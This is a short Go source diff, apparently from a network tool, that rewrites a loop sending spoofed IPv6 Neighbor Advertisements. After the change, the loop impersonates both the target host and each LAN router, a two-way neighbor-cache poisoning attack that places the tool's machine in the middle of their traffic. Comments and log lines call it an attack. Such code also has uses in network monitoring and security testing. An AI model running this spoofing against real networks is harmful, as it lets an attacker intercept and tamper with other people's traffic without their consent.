@@ -70,7 +70,7 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 
 		// Attack when we have the router LLA only
 		if h.Router != nil {
-			srcAddr := packet.Addr{IP: h.Router.Addr.IP, MAC: h.session.NICInfo.HostMAC}
+			srcAddr := packet.Addr{IP: h.Router.Addr.IP, MAC: h.session.NICInfo.RouterMAC}
 			list := []packet.Addr{}
 			for _, router := range h.LANRouters {
 				list = append(list, router.Addr)
@@ -78,15 +78,22 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 
 			h.Unlock()
 
-			for _, addr := range list {
-				srcAddr.IP = addr.IP
-				if err := h.SendNeighborAdvertisement(srcAddr, dstAddr); err != nil {
+			for _, routerAddr := range list {
+				// spoof host
+				//
+				if err := h.SendNeighborAdvertisement(routerAddr, dstAddr, h.session.NICInfo.HostMAC); err != nil {
 					fmt.Println("icmp6 : error sending na ", err)
 				}
+
 				if nTimes%16 == 0 {
 					fmt.Printf("icmp6 : attack src %s dst %s repeat=%v duration=%v\n", srcAddr, dstAddr, nTimes, time.Since(startTime))
 				}
 				nTimes++
+
+				// spoof router
+				if err := h.SendNeighborAdvertisement(dstAddr, routerAddr, h.session.NICInfo.HostMAC); err != nil {
+					fmt.Println("icmp6 : error sending na ", err)
+				}
 			}
 		} else {
 			h.Unlock()
